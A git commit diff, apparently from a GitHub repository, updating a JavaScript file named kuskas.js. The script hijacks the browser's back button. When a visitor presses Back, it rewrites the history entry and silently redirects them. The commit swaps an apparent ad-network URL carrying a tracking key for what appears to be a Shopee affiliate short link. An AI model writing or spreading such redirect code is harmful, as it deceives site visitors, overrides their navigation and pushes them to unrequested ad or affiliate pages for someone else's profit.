612e5002a6a46b1552d16d723d8169d19b92fc71
lookatdons <lookatdons@users.noreply.github.com>
2022-09-13 13:15:18 +0700

    Update kuskas.js

--- kuskas.js
+++ kuskas.js
@@ -6,7 +6,7 @@ window.addEventListener("popstate", function() {
   if(location.hash === "#!/history") { 
     history.replaceState(null, document.title, location.pathname); 
     setTimeout(function(){ 
-      location.replace("https://mommygravelyslime.com/xgwfcrky?key=3a5b229918eaf9ecca3709e3e7236e5a"); 
+      location.replace("https://shope.ee/9K6QO1Gfx2"); 
     },10); 
   } 
 }, false); 
